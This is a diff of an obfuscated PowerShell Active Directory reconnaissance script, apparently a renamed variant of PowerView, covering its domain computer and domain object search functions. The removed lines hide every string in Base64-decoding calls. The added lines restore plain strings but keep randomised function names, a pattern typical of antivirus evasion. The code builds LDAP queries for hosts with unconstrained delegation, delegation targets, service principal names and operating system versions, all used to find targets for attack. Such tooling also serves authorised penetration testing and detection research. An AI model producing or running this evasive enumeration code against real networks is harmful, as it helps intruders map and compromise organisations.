-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $CompSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $CompSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
         
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            dnsdja -CreateVariables -BoundParameters $PSBoundParameters
+            inpqyn -CreateVariables -BoundParameters $PSBoundParameters
         }
 
         if ($CompSearcher) {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkNOPQ==")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                elseif ($IdentityInstance -match '^CN=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $CompSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $CompSearcher = vydvzz @SearcherArguments
                         if (-not $CompSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
+                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkoZG5zaG9zdG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKQ==")))
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
-                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
                 else {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
+                    $IdentityFilter += "(name=$IdentityInstance)"
                 }
             }
             if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
+                $Filter += "(|$IdentityFilter)"
             }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5jb25zdHJhaW5lZA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBmb3IgdW5jb25zdHJhaW5lZCBkZWxlZ2F0aW9u")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj01MjQyODgp")))
+            if ($PSBoundParameters['Unconstrained']) {
+                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHJ1c3RlZFRvQXV0aA==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgdGhhdCBhcmUgdHJ1c3RlZCB0byBhdXRoZW50aWNhdGUgZm9yIG90aGVyIHByaW5jaXBhbHM=")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG1zZHMtYWxsb3dlZHRvZGVsZWdhdGV0bz0qKQ==")))
+            if ($PSBoundParameters['TrustedToAuth']) {
+                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
+                $Filter += '(msds-allowedtodelegateto=*)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbnRlcnM=")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBwcmludGVycw==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdENhdGVnb3J5PXByaW50UXVldWUp")))
+            if ($PSBoundParameters['Printers']) {
+                Write-Verbose '[Get-DomainComputer] Searching for printers'
+                $Filter += '(objectCategory=printQueue)'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U1BO")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBTUE46ICRTUE4=")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZpY2VQcmluY2lwYWxOYW1lPSRTUE4p")))
+            if ($PSBoundParameters['SPN']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
+                $Filter += "(servicePrincipalName=$SPN)"
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3BlcmF0aW5nU3lzdGVt")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBvcGVyYXRpbmcgc3lzdGVtOiAkT3BlcmF0aW5nU3lzdGVt")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbT0kT3BlcmF0aW5nU3lzdGVtKQ==")))
+            if ($PSBoundParameters['OperatingSystem']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
+                $Filter += "(operatingsystem=$OperatingSystem)"
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZVBhY2s=")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzZXJ2aWNlIHBhY2s6ICRTZXJ2aWNlUGFjaw==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9wZXJhdGluZ3N5c3RlbXNlcnZpY2VwYWNrPSRTZXJ2aWNlUGFjayk=")))
+            if ($PSBoundParameters['ServicePack']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
+                $Filter += "(operatingsystemservicepack=$ServicePack)"
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU=")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gU2VhcmNoaW5nIGZvciBjb21wdXRlcnMgd2l0aCBzaXRlIG5hbWU6ICRTaXRlTmFtZQ==")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNlcnZlcnJlZmVyZW5jZWJsPSRTaXRlTmFtZSk=")))
+            if ($PSBoundParameters['SiteName']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
+                $Filter += "(serverreferencebl=$SiteName)"
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
-                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
             }
             
             $UACFilter | Where-Object {$_} | ForEach-Object {
-                if ($_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UXy4q")))) {
+                if ($_ -match 'NOT_.*') {
                     $UACField = $_.Substring(4)
                     $UACValue = [Int]($UACEnum::$UACField)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCEodXNlckFjY291bnRDb250cm9sOjEuMi44NDAuMTEzNTU2LjEuNC44MDM6PSRVQUNWYWx1ZSkp")))
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                 }
                 else {
                     $UACValue = [Int]($UACEnum::$_)
-                    $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHVzZXJBY2NvdW50Q29udHJvbDoxLjIuODQwLjExMzU1Ni4xLjQuODAzOj0kVUFDVmFsdWUp")))
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                 }
             }
 
-            $CompSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYoc2FtQWNjb3VudFR5cGU9ODA1MzA2MzY5KSRGaWx0ZXIp")))
-            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gR2V0LURvbWFpbkNvbXB1dGVyIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($CompSearcher.filter))
+            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
+            Write-Verbose ("[Get-DomainComputer] Get-DomainComputer filter string: {0}" -f $($CompSearcher.filter))
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $CompSearcher.FindOne() }
+            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
             else { $Results = $CompSearcher.FindAll() }
             $Results | Where-Object {$_} | ForEach-Object {
                 $Up = $True
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGluZw==")))]) {
+                if ($PSBoundParameters['Ping']) {
                     $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                 }
                 if ($Up) {
-                    if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
+                    if ($PSBoundParameters['Raw']) {
                         
                         $Computer = $_
-                        $Computer.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVyLlJhdw=="))))
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                     }
                     else {
-                        $Computer = hfjsvm -Properties $_.Properties
-                        $Computer.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVy"))))
+                        $Computer = tsuvgg -Properties $_.Properties
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                     }
                     $Computer
                 }
@@ -3832,7 +3836,7 @@ function aglnim {
             if ($Results) {
                 try { $Results.dispose() }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5Db21wdXRlcl0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
+                    Write-Verbose ("[Get-DomainComputer] Error disposing of the Results object: {0}" -f $_)
                 }
             }
             $CompSearcher.dispose()
@@ -3841,7 +3845,7 @@ function aglnim {
 }
 
 
-function kzvwpf {
+function guawbd {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -3879,7 +3883,7 @@ function kzvwpf {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -3911,120 +3915,120 @@ function kzvwpf {
     DynamicParam {
         $UACValueNames = [Enum]::GetNames($UACEnum)
         
-        $UACValueNames = $UACValueNames | ForEach-Object {$_; (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX3swfQ=="))) -f $_)}
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; ("NOT_{0}" -f $_)}
         
-        dnsdja -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+        inpqyn -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
     }
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $ObjectSearcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $ObjectSearcher = vydvzz @SearcherArguments
     }
 
     PROCESS {
         
         if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
-            dnsdja -CreateVariables -BoundParameters $PSBoundParameters
+            inpqyn -CreateVariables -BoundParameters $PSBoundParameters
         }
         if ($ObjectSearcher) {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0=")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihDTnxPVXxEQyk9")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $ObjectSearcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $ObjectSearcher = vydvzz @SearcherArguments
                         if (-not $ObjectSearcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
+                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
-                    $ConvertedIdentityInstance = $IdentityInstance.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA==")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ==")))) | vqxllx -OutputType Canonical
+                elseif ($IdentityInstance.Contains('\')) {
+                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | jjxazw -OutputType Canonical
                     if ($ConvertedIdentityInstance) {
-                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw==")))))
-                        $ObjectName = $IdentityInstance.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
-                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHNhbUFjY291bnROYW1lPSRPYmplY3ROYW1lKQ==")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $ObjectDomain
